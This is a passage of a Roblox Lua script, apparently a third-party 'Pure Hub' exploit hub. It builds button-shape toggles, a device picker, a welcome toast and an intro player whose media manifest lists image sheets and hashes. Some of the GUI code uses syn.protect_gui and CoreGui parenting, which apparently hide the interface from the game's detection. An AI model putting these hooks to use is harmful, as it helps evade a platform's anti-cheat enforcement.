            mobResetAllBtn.BackgroundColor3 = Color3.fromRGB(255, 90, 90); mobResetAllBtn.BorderSizePixel = 0
            mobResetAllBtn.Text = "Reset All"; mobResetAllBtn.TextColor3 = WHITE
            mobResetAllBtn.Font = Enum.Font.GothamBold; mobResetAllBtn.TextSize = 10
            mobResetAllBtn.AutoButtonColor = false; mobResetAllBtn.ZIndex = 5
            Instance.new("UICorner", mobResetAllBtn).CornerRadius = UDim.new(0,5)
            local mobResetAllStroke = Instance.new("UIStroke", mobResetAllBtn); mobResetAllStroke.Color = WHITE; mobResetAllStroke.Thickness = 1

            local mobResetStatusRow = mkRow(sfMobile)
            local mobResetStatusLbl = Instance.new("TextLabel", mobResetStatusRow)
            mobResetStatusLbl.Size = UDim2.new(1,0,1,0); mobResetStatusLbl.BackgroundTransparency = 1
            mobResetStatusLbl.Text = ""; mobResetStatusLbl.TextColor3 = BTN_ACT
            mobResetStatusLbl.Font = Enum.Font.GothamBold; mobResetStatusLbl.TextSize = 10
            mobResetStatusLbl.TextXAlignment = Enum.TextXAlignment.Left; mobResetStatusLbl.ZIndex = 5
            local function mobFlashStatus(msg)
                mobResetStatusLbl.Text = msg
                task.delay(3, function() if mobResetStatusLbl.Text == msg then mobResetStatusLbl.Text = "" end end)
            end

            wireResetAllButton(mobResetAllBtn, "Reset All", mobFlashStatus)
        end

        -- ─── Button Shapes ───────────────────────────────────────────────────
        mkSect(sfMobile, "Button Shapes")

        local mobCircleSet = mkToggle(sfMobile, "Circle Buttons", function(on)
            __HH.circleButtonsEnabled = on
            if on then
                __HH.shapeButtonsEnabled = false
                __HH.rectangularButtonsEnabled = false
                if setShapeVisual then setShapeVisual(false) end
                if setRectVisual then setRectVisual(false) end
            end
            if __HH.mobileButtonsEnabled then buildMobileButtons() end
            saveConfig()
        end, __HH.circleButtonsEnabled)

        local mobShapeSet = mkToggle(sfMobile, "Shape Buttons", function(on)
            __HH.shapeButtonsEnabled = on
            if on then
                __HH.circleButtonsEnabled = false
                __HH.rectangularButtonsEnabled = false
                if setCircleBtnsVisual then setCircleBtnsVisual(false) end
                if setRectVisual then setRectVisual(false) end
            end
            if __HH.mobileButtonsEnabled then buildMobileButtons() end
            saveConfig()
        end, __HH.shapeButtonsEnabled)

        local mobRectSet = mkToggle(sfMobile, "Rectangular Buttons", function(on)
            __HH.rectangularButtonsEnabled = on
            if on then
                __HH.circleButtonsEnabled = false
                __HH.shapeButtonsEnabled = false
                if setCircleBtnsVisual then setCircleBtnsVisual(false) end
                if setShapeVisual then setShapeVisual(false) end
            end
            if __HH.mobileButtonsEnabled then buildMobileButtons() end
            saveConfig()
        end, __HH.rectangularButtonsEnabled)

    end

    __HH.mainFrame.Visible = false
    miniToggleBtn.Visible = false
    print("[PURE HUB] iOS image/audio intro revision 3 | no VideoFrame | 11 seconds | ice-blue theme")
    print("Pure Hub GUI Fully Loaded")


end

loadConfig()
uiScaleValue = 0.6

-- ============================================================
-- DEVICE SELECTION (PC / MOBILE / CONTROLLER)
-- ============================================================
-- Shows a full-screen picker the first time the script ever runs (or again
-- after "Reset Device" is pressed from the Extra tab). PC and Controller
-- both hide the floating mobile buttons and rely on keybinds / gamepad
-- buttons; Mobile shows the floating buttons normally.
do
    local DEV_ICE   = Color3.fromRGB(201, 238, 255)
    local DEV_ACCENT= Color3.fromRGB(187, 232, 255)
    local DEV_NAVY  = Color3.fromRGB(12, 45, 71)
    local DEV_DARK  = Color3.fromRGB(6, 15, 25)

    -- Small toast used for the "welcome to pure hub!" message.
    local function showWelcomeToast()
        print("welcome to pure hub!")
        pcall(function()
            local coreGui = game:GetService("CoreGui")
            local playerGui = LP:WaitForChild("PlayerGui")
            local old = coreGui:FindFirstChild("HorizonWelcomeToast") or playerGui:FindFirstChild("HorizonWelcomeToast")
            if old then old:Destroy() end

            local toastGui = Instance.new("ScreenGui")
            toastGui.Name = "HorizonWelcomeToast"
            toastGui.ResetOnSpawn = false
            toastGui.IgnoreGuiInset = true
            toastGui.DisplayOrder = 2147483646
            if not pcall(function() toastGui.Parent = coreGui end) then
                toastGui.Parent = playerGui
            end

            local card = Instance.new("Frame", toastGui)
            card.AnchorPoint = Vector2.new(0.5, 0)
            card.Position = UDim2.new(0.5, 0, 0, 24)
            card.Size = UDim2.new(0, 280, 0, 44)
            card.BackgroundColor3 = DEV_DARK
            card.BackgroundTransparency = 0.05
            card.BorderSizePixel = 0
            Instance.new("UICorner", card).CornerRadius = UDim.new(0, 12)
            local cardStroke = Instance.new("UIStroke", card)
            cardStroke.Color = DEV_ACCENT; cardStroke.Thickness = 1.4; cardStroke.Transparency = 0.15

            local lbl = Instance.new("TextLabel", card)
            lbl.BackgroundTransparency = 1
            lbl.Size = UDim2.new(1, -16, 1, 0)
            lbl.Position = UDim2.new(0, 8, 0, 0)
            lbl.Text = "welcome to pure hub!"
            lbl.Font = Enum.Font.GothamBlack
            lbl.TextSize = 15
            lbl.TextColor3 = DEV_ICE
            lbl.TextXAlignment = Enum.TextXAlignment.Center

            card.BackgroundTransparency = 1
            cardStroke.Transparency = 1
            lbl.TextTransparency = 1
            local TSvc = game:GetService("TweenService")
            TSvc:Create(card, TweenInfo.new(0.25), {BackgroundTransparency = 0.05}):Play()
            TSvc:Create(cardStroke, TweenInfo.new(0.25), {Transparency = 0.15}):Play()
            TSvc:Create(lbl, TweenInfo.new(0.25), {TextTransparency = 0}):Play()
            task.delay(2.6, function()
                if not toastGui.Parent then return end
                TSvc:Create(card, TweenInfo.new(0.3), {BackgroundTransparency = 1}):Play()
                TSvc:Create(cardStroke, TweenInfo.new(0.3), {Transparency = 1}):Play()
                TSvc:Create(lbl, TweenInfo.new(0.3), {TextTransparency = 1}):Play()
                task.delay(0.35, function() pcall(function() toastGui:Destroy() end) end)
            end)
        end)
    end
    __HH.showWelcomeToast = showWelcomeToast

    -- Same picker structure/behaviour as the original source (backdrop +
    -- centered card + row of mode buttons, MouseButton1Click sets the
    -- selection and destroys the GUI, then a blocking wait returns the
    -- result) — only the name, the color scheme (ice blue instead of
    -- white/black) and a third "CONTROLLER" button were added/changed.
    local function choosePlatformMode()
        local pickerGui = Instance.new("ScreenGui")
        pickerGui.Name = "HorizonDevicePicker"
        pickerGui.ResetOnSpawn = false
        pickerGui.IgnoreGuiInset = true
        pickerGui.DisplayOrder = 9998 -- stays below the intro and appears after it disappears
        pickerGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        pcall(function() if syn and syn.protect_gui then syn.protect_gui(pickerGui) end end)
        if not pcall(function() pickerGui.Parent = game:GetService("CoreGui") end) then
            pickerGui.Parent = LP:WaitForChild("PlayerGui")
        end

        local backdrop = Instance.new("Frame", pickerGui)
        backdrop.Size = UDim2.fromScale(1, 1)
        backdrop.BackgroundColor3 = DEV_ICE
        backdrop.BorderSizePixel = 0
        backdrop.ZIndex = 1

        local card = Instance.new("Frame", backdrop)
        card.AnchorPoint = Vector2.new(0.5, 0.5)
        card.Position = UDim2.fromScale(0.5, 0.5)
        card.Size = UDim2.fromOffset(460, 220)
        card.BackgroundColor3 = DEV_ICE
        card.BorderSizePixel = 0
        card.ZIndex = 2
        Instance.new("UICorner", card).CornerRadius = UDim.new(0, 16)
        local cardStroke = Instance.new("UIStroke", card)
        cardStroke.Color = DEV_NAVY
        cardStroke.Thickness = 2

        local title = Instance.new("TextLabel", card)
        title.Size = UDim2.new(1, -30, 0, 42)
        title.Position = UDim2.fromOffset(15, 18)
        title.BackgroundTransparency = 1
        title.Text = "SELECT YOUR DEVICE"
        title.TextColor3 = DEV_NAVY
        title.Font = Enum.Font.PermanentMarker
        title.TextSize = 22
        title.ZIndex = 3

        local hint = Instance.new("TextLabel", card)
        hint.Size = UDim2.new(1, -30, 0, 24)
        hint.Position = UDim2.fromOffset(15, 58)
        hint.BackgroundTransparency = 1
        hint.Text = "Choose the interface mode"
        hint.TextColor3 = DEV_NAVY
        hint.Font = Enum.Font.Gotham
        hint.TextSize = 12
        hint.ZIndex = 3

        local selected = nil
        local function makeButton(label, x, device)
            local button = Instance.new("TextButton", card)
            button.Size = UDim2.fromOffset(130, 62)
            button.Position = UDim2.fromOffset(x, 112)
            button.BackgroundColor3 = DEV_ACCENT
            button.BorderSizePixel = 0
            button.AutoButtonColor = false
            button.Text = label
            button.TextColor3 = DEV_NAVY
            button.Font = Enum.Font.GothamBold
            button.TextSize = 18
            button.ZIndex = 3
            Instance.new("UICorner", button).CornerRadius = UDim.new(0, 10)
            local stroke = Instance.new("UIStroke", button)
            stroke.Color = DEV_NAVY
            stroke.Thickness = 1
            button.MouseButton1Click:Connect(function()
                selected = device
                pickerGui:Destroy()
            end)
            return button
        end

        makeButton("PC", 20, "PC")
        makeButton("MOBILE", 165, "MOBILE")
        makeButton("CONTROLLER", 310, "CONTROLLER")

        while pickerGui.Parent and not selected do
            task.wait()
        end
        return selected or "PC"
    end
    __HH.choosePlatformMode = choosePlatformMode

    -- Runs the picker (if needed) and applies the resulting device choice.
    -- force = true always re-shows the picker (used by "Reset Device").
    __HH.runDeviceSelection = function(force)
        if force or not __HH.selectedDevice then
            local device = choosePlatformMode()
            __HH.selectedDevice = device
            __HH.mobileButtonsEnabled = (device == "MOBILE")
            saveConfig()
            if __HH.mobGuiRef then
                if __HH.mobileButtonsEnabled and buildMobileButtons then
                    task.spawn(buildMobileButtons)
                elseif destroyMobileButtons then
                    destroyMobileButtons()
                end
            end
            if setMobVisual then pcall(setMobVisual, __HH.mobileButtonsEnabled) end
            showWelcomeToast()
        end
    end
end

local function _runIntro(onComplete)
    -- Pure Hub iOS revision 3: image frames + source audio, not native video.
    -- Only audio extracted from the supplied video is played; no old intro song.
    -- Loading time is separate from the 11-second presentation timer.
    local INTRO_DURATION = 11
    local MAX_LOADING_TIME = 30
    local coreGui = game:GetService("CoreGui")
    local playerGui = LP:WaitForChild("PlayerGui")
    local soundService = game:GetService("SoundService")
    local runService = game:GetService("RunService")
    local contentProvider = game:GetService("ContentProvider")
    local ice = Color3.fromRGB(201, 238, 255)
    local iceButton = Color3.fromRGB(187, 232, 255)
    local navy = Color3.fromRGB(8, 36, 57)

    -- Remove previous intros, including old-brand instances left by a rerun.
    for _, parent in ipairs({coreGui, playerGui}) do
        for _, name in ipairs({"PureVideoIntro", "PureVideoError", "PureStarIntro", "BloomStarIntro", "HorizonDuelsIntro", "MonsterIntro", "HorizonHubIntro"}) do
            pcall(function()
                local old = parent:FindFirstChild(name)
                if old then
                    local cancel = old:FindFirstChild("PureIntroCancel")
                    if cancel and cancel:IsA("BindableEvent") then cancel:Fire() end
                    old:Destroy()
                end
            end)
        end
    end
    -- Stop the removed song if an older copy of the script is still playing.
    for _, name in ipairs({"BloomIntroPlaylistSong1", "PureIntroPlaylistSong1", "PureIntroVideoAudio"}) do
        pcall(function()
            local old = soundService:FindFirstChild(name)
            if old then old:Stop(); old:Destroy() end
        end)
    end

    local introGui = Instance.new("ScreenGui")
    introGui.Name = "PureVideoIntro"
    introGui.ResetOnSpawn = false
    introGui.IgnoreGuiInset = true
    introGui.DisplayOrder = 2147483647
    introGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pcall(function() if syn and syn.protect_gui then syn.protect_gui(introGui) end end)
    -- Normal rendered PlayerGui. No native video decoding is requested.
    introGui.Enabled = true
    if not pcall(function() introGui.Parent = playerGui end) then introGui.Parent = coreGui end

    local background = Instance.new("Frame", introGui)
    background.Name = "VideoBackground"
    background.Size = UDim2.fromScale(1, 1)
    background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    background.BorderSizePixel = 0
    background.Active = true
    background.ZIndex = 1

    local brand = Instance.new("TextLabel", background)
    brand.Name = "PureHubTitle"
    brand.Position = UDim2.fromOffset(16, 16)
    brand.Size = UDim2.fromOffset(150, 32)
    brand.BackgroundTransparency = 1
    brand.Text = "PURE HUB"
    brand.Font = Enum.Font.GothamBlack
    brand.TextSize = 14
    brand.TextColor3 = ice
    brand.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    brand.TextStrokeTransparency = 0.25
    brand.TextXAlignment = Enum.TextXAlignment.Left
    brand.ZIndex = 10

    local status = Instance.new("TextLabel", background)
    status.Name = "LoadingStatus"
    status.AnchorPoint = Vector2.new(0.5, 0.5)
    status.Position = UDim2.fromScale(0.5, 0.5)
    status.Size = UDim2.new(1, -48, 0, 50)
    status.BackgroundTransparency = 1
    status.Text = "Preparing video pictures and audio..."
    status.Font = Enum.Font.GothamMedium
    status.TextSize = 16
    status.TextColor3 = ice
    status.TextWrapped = true
    status.ZIndex = 9

    local diagnostic = Instance.new("TextLabel", background)
    diagnostic.Name = "VideoDiagnostic"
    diagnostic.AnchorPoint = Vector2.new(0.5, 0)
    diagnostic.Position = UDim2.new(0.5, 0, 0.5, 34)
    diagnostic.Size = UDim2.new(1, -48, 0, 76)
    diagnostic.BackgroundTransparency = 1
    diagnostic.Text = "PHI-PREP: image/audio renderer for iOS"
    diagnostic.Font = Enum.Font.Gotham
    diagnostic.TextSize = 11
    diagnostic.TextColor3 = ice
    diagnostic.TextWrapped = true
    diagnostic.ZIndex = 10

    local countdown = Instance.new("TextLabel", background)
    countdown.Name = "IntroCountdown"
    countdown.AnchorPoint = Vector2.new(0.5, 1)
    countdown.Position = UDim2.new(0.5, 0, 1, -16)
    countdown.Size = UDim2.fromOffset(100, 24)
    countdown.BackgroundTransparency = 1
    countdown.Text = "11s"
    countdown.Font = Enum.Font.GothamMedium
    countdown.TextSize = 12
    countdown.TextColor3 = ice
    countdown.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    countdown.TextStrokeTransparency = 0.2
    countdown.Visible = false
    countdown.ZIndex = 10

    local skip = Instance.new("TextButton", background)
    skip.Name = "SkipIntro"
    skip.AnchorPoint = Vector2.new(1, 0)
    skip.Position = UDim2.new(1, -16, 0, 16)
    skip.Size = UDim2.fromOffset(106, 40)
    skip.BackgroundColor3 = iceButton
    skip.BorderSizePixel = 0
    skip.AutoButtonColor = true
    skip.Text = "Skip >"
    skip.TextColor3 = navy
    skip.Font = Enum.Font.GothamBold
    skip.TextSize = 14
    skip.ZIndex = 20
    skip.Selectable = true
    Instance.new("UICorner", skip).CornerRadius = UDim.new(0, 10)
    local skipStroke = Instance.new("UIStroke", skip)
    skipStroke.Color = Color3.fromRGB(225, 246, 255)
    skipStroke.Thickness = 1.2
    skipStroke.Transparency = 0.15

    -- This player uses ordinary images + the supplied video's own audio.
    -- It NEVER creates a VideoFrame, requests MP4 decoding, or uses a GIF.
    local finished, playbackStarted = false, false
    local connections = {}
    local sound = nil
    local audioTaskDone, allSheetsPrepared = false, false
    local sheetStates, warmers = {}, {}
    local displayedSheet, displayedFrame, frontIndex = 0, 0, 1
    local audioEnded, lastAudioPosition, lastAudioMovement = false, 0, 0
    local warnedAudioClock = false
    local media = {
        -- Original archive metadata only; the player uses the JPEG sheets.
        -- The MP4 is no longer embedded and is not needed at runtime.
        original = {
            size = 1246748, sha256 = "8a0d388b3914ea13f8b995066c75782ab7e76bc0cc24d5ef5124e4779a5be097",
        },
        fps = 30, frameWidth = 480, frameHeight = 480,
        cell = 484, padding = 2, columns = 2, perSheet = 4,
        frameCount = 312, sourceDuration = 10.403,
        audio = {
            {label="MP3", file="pure_ios_video_audio_5de17553aaca.mp3", size=335246, signature="mp3", sha256="5de17553aacae7a34a3075039422b3d8c08c9acad93c86518daf386bcebf6601"},
        },
        sheets = {
            {label="pure_ios_frames_001_ea49bb949d90.jpg", file="pure_ios_frames_001_ea49bb949d90.jpg", size=116702, signature="jpeg", sha256="ea49bb949d9047e58cd2b8612677b7c5fbb827229138f4b315fec5e8afc41469"},
            {label="pure_ios_frames_002_99372e37bdc6.jpg", file="pure_ios_frames_002_99372e37bdc6.jpg", size=116179, signature="jpeg", sha256="99372e37bdc6a13ca9f2f59312abfc59446e1096f5e59c7e382e77d8595bea6c"},
            {label="pure_ios_frames_003_41990e72b725.jpg", file="pure_ios_frames_003_41990e72b725.jpg", size=114052, signature="jpeg", sha256="41990e72b725f10503ecd5b2bce720e45cb6c8fafeabf05ea268df7b3eed20b7"},
            {label="pure_ios_frames_004_7e616dffb0c2.jpg", file="pure_ios_frames_004_7e616dffb0c2.jpg", size=120630, signature="jpeg", sha256="7e616dffb0c2fd44d94089788a2d601f8c2eebd977323f10ef42e1181fd3a858"},
            {label="pure_ios_frames_005_b702a2a0f476.jpg", file="pure_ios_frames_005_b702a2a0f476.jpg", size=111156, signature="jpeg", sha256="b702a2a0f476fa38a4d75c19bd416c8edfa816fa8a5a07650dd0971beaf47434"},
            {label="pure_ios_frames_006_4f30ed84217d.jpg", file="pure_ios_frames_006_4f30ed84217d.jpg", size=69136, signature="jpeg", sha256="4f30ed84217db2a2a37cee1a8e54547a71b27a8ce552610aa2f22e1326c62579"},
            {label="pure_ios_frames_007_89314dc0680b.jpg", file="pure_ios_frames_007_89314dc0680b.jpg", size=69760, signature="jpeg", sha256="89314dc0680badf324ed2e37adeb7cd0fada87eab9a054e96fe0b19cdf008e00"},
            {label="pure_ios_frames_008_c0d528534a41.jpg", file="pure_ios_frames_008_c0d528534a41.jpg", size=95541, signature="jpeg", sha256="c0d528534a412eb9a26ea3f35735bbeb826c0bed0f11da32dba61de6b989fe99"},
            {label="pure_ios_frames_009_e6e8c48b96a6.jpg", file="pure_ios_frames_009_e6e8c48b96a6.jpg", size=103801, signature="jpeg", sha256="e6e8c48b96a61c1236827109cc6ff19c0bb8f3f41cc819a9f684a6c609b55d1b"},
            {label="pure_ios_frames_010_d5a49263d8af.jpg", file="pure_ios_frames_010_d5a49263d8af.jpg", size=82970, signature="jpeg", sha256="d5a49263d8af782665222493358db1b2cb44d060f5212a19ddb89f298c9a4a75"},
            {label="pure_ios_frames_011_a83f63023dc3.jpg", file="pure_ios_frames_011_a83f63023dc3.jpg", size=61430, signature="jpeg", sha256="a83f63023dc3c897e9034f3f1ae2bfc5cfc66e0cf4188415f7f4f0a8fb3a5f43"},
            {label="pure_ios_frames_012_4f066b17c99c.jpg", file="pure_ios_frames_012_4f066b17c99c.jpg", size=61659, signature="jpeg", sha256="4f066b17c99cc2a66d1851eb34e767072a9716671a71e916bbfe795c389f3c2e"},
            {label="pure_ios_frames_013_233fb6da0008.jpg", file="pure_ios_frames_013_233fb6da0008.jpg", size=89347, signature="jpeg", sha256="233fb6da00081a8c6a4b4e9778bf063b95f16ce689357eeb6a45397f260566ea"},
            {label="pure_ios_frames_014_40539be71d3e.jpg", file="pure_ios_frames_014_40539be71d3e.jpg", size=86185, signature="jpeg", sha256="40539be71d3e8a32a5f50ed798ff98239f7d4aba60b1814b772f3fd61d860dcc"},
            {label="pure_ios_frames_015_f4a746aa2610.jpg", file="pure_ios_frames_015_f4a746aa2610.jpg", size=85816, signature="jpeg", sha256="f4a746aa26107c8a79a2d5d017b2fa0da6c21b3b45cf2967bd866bd791745e95"},
            {label="pure_ios_frames_016_df467e56edd6.jpg", file="pure_ios_frames_016_df467e56edd6.jpg", size=83330, signature="jpeg", sha256="df467e56edd6692c464c5921a8c8ec9e2f192b9f1e33c500f6ae92ea7a4c9367"},
            {label="pure_ios_frames_017_383d6108a560.jpg", file="pure_ios_frames_017_383d6108a560.jpg", size=82834, signature="jpeg", sha256="383d6108a560f6badefb80a33ee6dca654a3bb2108e6f414374b4c4b97c826c0"},
            {label="pure_ios_frames_018_727d35b4cc11.jpg", file="pure_ios_frames_018_727d35b4cc11.jpg", size=80883, signature="jpeg", sha256="727d35b4cc11b98bc630243c89821dcb1737e2da0d4565ffa2db48932e7b835f"},
            {label="pure_ios_frames_019_8add118be420.jpg", file="pure_ios_frames_019_8add118be420.jpg", size=76226, signature="jpeg", sha256="8add118be420ef47cee7749b7eb4f93533177a7f63f8332834d0539e2abc10d7"},
            {label="pure_ios_frames_020_6e735f4cbc59.jpg", file="pure_ios_frames_020_6e735f4cbc59.jpg", size=80839, signature="jpeg", sha256="6e735f4cbc59fe1910c5c60364424857fb6abe28ceacbc5c89059a5af4e563ee"},
            {label="pure_ios_frames_021_5179f274aaad.jpg", file="pure_ios_frames_021_5179f274aaad.jpg", size=74841, signature="jpeg", sha256="5179f274aaadf00d4b3bb686315f59b9329149c8426aa93e4a93f996392cd02c"},
            {label="pure_ios_frames_022_578fb3adec65.jpg", file="pure_ios_frames_022_578fb3adec65.jpg", size=77604, signature="jpeg", sha256="578fb3adec659c52df37d33ef3e07caddeb8f3da42e1ab6d22d0c3ad4594222d"},
            {label="pure_ios_frames_023_89fe700cd7b3.jpg", file="pure_ios_frames_023_89fe700cd7b3.jpg", size=81015, signature="jpeg", sha256="89fe700cd7b38ba6ee794123646ebad5489fb4a1e4d809c92847f3710712e688"},
            {label="pure_ios_frames_024_1a3874434286.jpg", file="pure_ios_frames_024_1a3874434286.jpg", size=83888, signature="jpeg", sha256="1a3874434286fe55d1498c255cece6088f3e837531bf4db20690e41f92de3e14"},
            {label="pure_ios_frames_025_8d5ad86c657f.jpg", file="pure_ios_frames_025_8d5ad86c657f.jpg", size=95465, signature="jpeg", sha256="8d5ad86c657f06519c24f13139a71714771a23cfe87b4cfaac8722367b6ec376"},
            {label="pure_ios_frames_026_ec6d28f74afc.jpg", file="pure_ios_frames_026_ec6d28f74afc.jpg", size=95841, signature="jpeg", sha256="ec6d28f74afcadc31674b3a4a98ccb737eba58c69563cdd988aa768ad39aba1e"},
            {label="pure_ios_frames_027_0e1e31b172ca.jpg", file="pure_ios_frames_027_0e1e31b172ca.jpg", size=82934, signature="jpeg", sha256="0e1e31b172cadc8faa69288b32fd87a8da72569d40f9eb01750746771891ea97"},
            {label="pure_ios_frames_028_187022097f56.jpg", file="pure_ios_frames_028_187022097f56.jpg", size=80293, signature="jpeg", sha256="187022097f565cb9eb83517b06b6ffaa80bb8dbb1067b59ac5a5027da741e555"},
            {label="pure_ios_frames_029_7bd908fb41e1.jpg", file="pure_ios_frames_029_7bd908fb41e1.jpg", size=81135, signature="jpeg", sha256="7bd908fb41e1bfc838f229a3431084045e3769dbb840ed952759459126688cc5"},
            {label="pure_ios_frames_030_aa47542d9957.jpg", file="pure_ios_frames_030_aa47542d9957.jpg", size=82028, signature="jpeg", sha256="aa47542d9957d8fa5f2e35b3a18a3dc350515fc1148dd1d68cd8c4231343a800"},
            {label="pure_ios_frames_031_223d255669f5.jpg", file="pure_ios_frames_031_223d255669f5.jpg", size=102690, signature="jpeg", sha256="223d255669f5f3346a77645979d2e6ffba388b05148a9bd40654a3f57660d337"},
            {label="pure_ios_frames_032_0983b65354e2.jpg", file="pure_ios_frames_032_0983b65354e2.jpg", size=163839, signature="jpeg", sha256="0983b65354e209324e7d81d94479024a28518e1ae5e9dab3d3afbff66b3ae526"},
            {label="pure_ios_frames_033_9e02372904ad.jpg", file="pure_ios_frames_033_9e02372904ad.jpg", size=130037, signature="jpeg", sha256="9e02372904ad25d9f4f41935e77e83119d416e1fb32f5c81d5fa9f763704614e"},
            {label="pure_ios_frames_034_581db2464cec.jpg", file="pure_ios_frames_034_581db2464cec.jpg", size=123053, signature="jpeg", sha256="581db2464cec94a5ec79b3b80e84150c32745bafac348f06c86432d0b883f1d2"},
            {label="pure_ios_frames_035_08b44c1bab86.jpg", file="pure_ios_frames_035_08b44c1bab86.jpg", size=107603, signature="jpeg", sha256="08b44c1bab869bd78b1e4b5881df2479ea8fa9b0b2e8175cd13e73d2e988b815"},
            {label="pure_ios_frames_036_e542801a2849.jpg", file="pure_ios_frames_036_e542801a2849.jpg", size=96677, signature="jpeg", sha256="e542801a2849f378ca97dd7009e6c6c3ac2a96137eb08978faeddccbe7ed2bf4"},
            {label="pure_ios_frames_037_3539393892dc.jpg", file="pure_ios_frames_037_3539393892dc.jpg", size=93026, signature="jpeg", sha256="3539393892dca5f1a53d75f9ca65ed57502fd5d45ecadf5e3f196179a02f13c1"},
            {label="pure_ios_frames_038_72f860fd9378.jpg", file="pure_ios_frames_038_72f860fd9378.jpg", size=93811, signature="jpeg", sha256="72f860fd93783a22c68bbe4f73eeca4d4598e97eee3e3b7feec33a651f0e30be"},
            {label="pure_ios_frames_039_f741bdd3decc.jpg", file="pure_ios_frames_039_f741bdd3decc.jpg", size=90080, signature="jpeg", sha256="f741bdd3decc0f235fca83b4f355d7b648fe260599e04efa77cd1877ab80ab96"},
            {label="pure_ios_frames_040_91adb9396bb5.jpg", file="pure_ios_frames_040_91adb9396bb5.jpg", size=106782, signature="jpeg", sha256="91adb9396bb57ae939b946f005645677738d0afd83417c8f000b8065138d5464"},
            {label="pure_ios_frames_041_9d4142576a70.jpg", file="pure_ios_frames_041_9d4142576a70.jpg", size=113380, signature="jpeg", sha256="9d4142576a702cd0bdb0303a262cc16963431325cf48cd32e1bc10cb1668cce4"},
            {label="pure_ios_frames_042_0bf08975e580.jpg", file="pure_ios_frames_042_0bf08975e580.jpg", size=99249, signature="jpeg", sha256="0bf08975e58019d795003163540741fb751342b9f25b7bb300e1377acded1b42"},
            {label="pure_ios_frames_043_8e49a7a70d8b.jpg", file="pure_ios_frames_043_8e49a7a70d8b.jpg", size=90739, signature="jpeg", sha256="8e49a7a70d8b5f9430f368b088170e9c4bffb49b718a21a25a9e9518409061ce"},
            {label="pure_ios_frames_044_366981db262b.jpg", file="pure_ios_frames_044_366981db262b.jpg", size=96633, signature="jpeg", sha256="366981db262b22d3f61442f2e43c9b62cd337d67c4c984bf3940bee0b5e1fff0"},
            {label="pure_ios_frames_045_d85dab55b679.jpg", file="pure_ios_frames_045_d85dab55b679.jpg", size=97556, signature="jpeg", sha256="d85dab55b6795c8b23cd431d69b45a338db5ec6bf7c06dcf22cf52fe28a3dd4e"},
            {label="pure_ios_frames_046_82fbc5a75dc8.jpg", file="pure_ios_frames_046_82fbc5a75dc8.jpg", size=100377, signature="jpeg", sha256="82fbc5a75dc8bae283d61d1b500cb69bf4e84b429a3ffabc643cf304ea400155"},
            {label="pure_ios_frames_047_4faf8ab51238.jpg", file="pure_ios_frames_047_4faf8ab51238.jpg", size=101375, signature="jpeg", sha256="4faf8ab512384eb8fb16c05079518a6f94147937541e3c533f0e3f4a0d1fbc0f"},
            {label="pure_ios_frames_048_37a9efec802c.jpg", file="pure_ios_frames_048_37a9efec802c.jpg", size=97219, signature="jpeg", sha256="37a9efec802ca5e743a60fd79d4a317e50d8ec2405ad23d74172e747ce625556"},
            {label="pure_ios_frames_049_a7abb83a8ffc.jpg", file="pure_ios_frames_049_a7abb83a8ffc.jpg", size=92835, signature="jpeg", sha256="a7abb83a8ffc3600209f774b9a0c0d5b77d0f313324b6c48b9d8c447fab2baa0"},
            {label="pure_ios_frames_050_1673da80937a.jpg", file="pure_ios_frames_050_1673da80937a.jpg", size=93058, signature="jpeg", sha256="1673da80937a9cd267ecd59c54639c77c42040cf9181f54143105ade69aaaae4"},
            {label="pure_ios_frames_051_cde33c51a224.jpg", file="pure_ios_frames_051_cde33c51a224.jpg", size=75717, signature="jpeg", sha256="cde33c51a22404611bcb996ba75ac68098d6600d7cbb1a619eb5c702215ab3f1"},
            {label="pure_ios_frames_052_9acf063c9f94.jpg", file="pure_ios_frames_052_9acf063c9f94.jpg", size=93094, signature="jpeg", sha256="9acf063c9f942226a05c4a57bddf527930eb22f5a12e86b9ef8d17fd2331adf4"},
            {label="pure_ios_frames_053_7b872b7ed404.jpg", file="pure_ios_frames_053_7b872b7ed404.jpg", size=114024, signature="jpeg", sha256="7b872b7ed4043b20f5f98c5e57f844f6606759a2670183148b82f31625dfdbe7"},
            {label="pure_ios_frames_054_3222d28c956b.jpg", file="pure_ios_frames_054_3222d28c956b.jpg", size=122426, signature="jpeg", sha256="3222d28c956b60b985a737be9883fb480a82ba03e10f3caeb3967f331d34f67d"},
            {label="pure_ios_frames_055_90a809216131.jpg", file="pure_ios_frames_055_90a809216131.jpg", size=130415, signature="jpeg", sha256="90a809216131ddba3239c3d68bbb67ed43dd7852a4c3d6e9cda2e166fa836085"},
            {label="pure_ios_frames_056_6d5a45de4e77.jpg", file="pure_ios_frames_056_6d5a45de4e77.jpg", size=131489, signature="jpeg", sha256="6d5a45de4e77b7e20830511e481999787855debaeb9990fc41aed1a640808aff"},
            {label="pure_ios_frames_057_ca9e71c76e88.jpg", file="pure_ios_frames_057_ca9e71c76e88.jpg", size=134651, signature="jpeg", sha256="ca9e71c76e888f6f10950ef5f70c651bc3afe35c69c879ce0acaf65ad2c489bf"},
            {label="pure_ios_frames_058_d9a285dade6d.jpg", file="pure_ios_frames_058_d9a285dade6d.jpg", size=136115, signature="jpeg", sha256="d9a285dade6d5540a79a4fd7499cd9827d4a3aac3d1187c6f4802d9c29d13528"},
            {label="pure_ios_frames_059_e0708983052d.jpg", file="pure_ios_frames_059_e0708983052d.jpg", size=143482, signature="jpeg", sha256="e0708983052d79f6ed8533ba36a396a657604a6a3484f7fba99502ba78075c14"},
            {label="pure_ios_frames_060_ed6e877d6a79.jpg", file="pure_ios_frames_060_ed6e877d6a79.jpg", size=149275, signature="jpeg", sha256="ed6e877d6a79beec81d77c3431a8b27fc931fb65096f4585522717f4cde7aa57"},
            {label="pure_ios_frames_061_c5bba4d14874.jpg", file="pure_ios_frames_061_c5bba4d14874.jpg", size=138389, signature="jpeg", sha256="c5bba4d14874a3b09da513fb51e981c14e5d7b661640e72826756449ef7928a8"},
            {label="pure_ios_frames_062_e9ae401a39ff.jpg", file="pure_ios_frames_062_e9ae401a39ff.jpg", size=142794, signature="jpeg", sha256="e9ae401a39ffd424286dd5ff665f38ffc27cc6619c810d9a5cb1fc076d94ef8b"},
            {label="pure_ios_frames_063_985722cebb75.jpg", file="pure_ios_frames_063_985722cebb75.jpg", size=146576, signature="jpeg", sha256="985722cebb7547579eaf686848dceaba531c7c881db83bbd7b2872be1f04ca8b"},
